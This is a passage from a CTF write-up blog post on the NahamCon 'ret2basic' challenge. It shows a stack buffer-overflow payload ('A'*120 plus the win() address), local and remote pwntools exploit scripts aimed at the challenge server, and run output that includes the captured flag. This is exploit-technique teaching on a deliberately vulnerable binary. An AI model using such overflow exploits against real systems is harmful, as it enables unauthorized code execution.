</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ <span class="o">(</span>python <span class="nt">-c</span> <span class="s2">"print 'A'*120 + '</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">12@</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00'"</span><span class="o">)</span> | ./ret2basic
Can you overflow this?: Failed to open the flag file.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Bingo ! This time we got <code class="language-plaintext highlighter-rouge">Failed to open the flag file.</code> which confirms we successfully called <code class="language-plaintext highlighter-rouge">win()</code> function, although we were not able to read the flag since we called the service locally. Letâ€™s write a exploit using pwntools which will call the remote service of this challenge.</p>

<h3 id="local-exploit">Local Exploit</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2basic"</span><span class="p">)</span>
<span class="n">win</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">win</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">120</span> <span class="o">+</span> <span class="n">win</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Can you overflow this?:"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>One of the advantage of using pwntools is that we donâ€™t need to hardcode any address, we can use <code class="language-plaintext highlighter-rouge">elf.symbols.win</code> which will fetch the address of <code class="language-plaintext highlighter-rouge">win()</code> from the elf binary specified.</p>

<p>Running the exploit:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ python3 local.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/nahamcon/binary/ret2basic'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'/root/Documents/nahamcon/binary/ret2basic'</span>: pid 76643
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Process <span class="s1">'/root/Documents/nahamcon/binary/ret2basic'</span> stopped with <span class="nb">exit </span>code 1 <span class="o">(</span>pid 76643<span class="o">)</span>
Failed to open the flag file.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got EOF <span class="k">while </span>reading <span class="k">in </span>interactive
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Great! Itâ€™s working. Letâ€™s just tweak it to run on remote service and grab the flag:</p>

<h3 id="remote-exploit">Remote Exploit</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2basic"</span><span class="p">)</span>                        <span class="c1">#ELF binary
</span><span class="n">win</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">win</span><span class="p">)</span>                      <span class="c1">#win= 0x401215 (info functions)/p win
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">120</span> <span class="o">+</span> <span class="n">win</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"challenge.nahamcon.com"</span><span class="p">,</span> <span class="mi">32043</span><span class="p">)</span> <span class="c1">#remote connection
</span>    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Can you overflow this?:"</span><span class="p">)</span>      <span class="c1">#Waiting until this line
</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>                         <span class="c1">#Sending payload
</span>    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="pwning">Pwning</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ python exp.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/nahamcon/binary/ret2basic'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span>+] Opening connection to challenge.nahamcon.com on port 32043: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Can you overflow this?: Here<span class="s1">'s your flag.
flag{d07f3219a8715e9339f31cfbe09d6502}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to challenge.nahamcon.com port 32043
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>And we pwned the challenge !</p>

<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
:ET